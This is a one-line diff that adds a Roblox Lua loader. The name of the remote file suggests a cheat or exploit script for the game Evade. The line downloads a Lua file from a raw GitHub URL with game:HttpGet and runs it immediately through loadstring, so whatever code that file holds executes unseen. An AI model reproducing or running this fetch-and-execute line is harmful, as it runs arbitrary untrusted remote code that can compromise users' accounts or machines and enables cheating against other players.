@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/moduletanagerdefend/loaders/main/loaders/1-5x-hlwn-evade-spam4-fbh8eq6dnucbgi.lua"))()
